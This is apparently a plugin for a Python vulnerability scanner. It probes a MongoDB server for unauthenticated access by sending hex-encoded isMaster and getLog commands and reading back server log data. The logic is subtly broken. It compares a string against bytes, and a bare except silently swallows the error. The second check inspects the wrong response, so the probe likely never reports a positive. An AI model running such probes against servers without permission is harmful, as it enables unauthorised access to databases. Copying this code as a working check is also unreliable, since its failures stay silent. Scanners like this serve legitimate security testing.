#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author = 'orleven'

import socket
from script import Script, SERVICE_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.MONGODB
        self.name = 'mongodb unauth'
        self.keyword = ['mongodb', 'unauth']
        self.info = 'Check the mongodb unauthorized access'
        self.type = 'unauth'
        self.level = 'high'
        Script.__init__(self, target=target, service_type=self.service_type)

    def prove(self):
        try:
            socket.setdefaulttimeout(5)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.target_host, self.target_port))
            data = bytes.fromhex(
                "3a000000a741000000000000d40700000000000061646d696e2e24636d640000000000ffffffff130000001069736d6173746572000100000000")
            s.send(data)
            result = s.recv(1024)
            if "ismaster" in result:
                getlog_data = bytes.fromhex(
                    "480000000200000000000000d40700000000000061646d696e2e24636d6400000000000100000021000000026765744c6f670010000000737461727475705761726e696e67730000")
                s.send(getlog_data)
                info = s.recv(1024)
                if "totalLinesWritten" in result:
                    self.flag = 1
                    self.res.append({"info": info[:100], "key": "mongodb_unauth", "mongodb_info": info})
        except Exception as e:
            pass
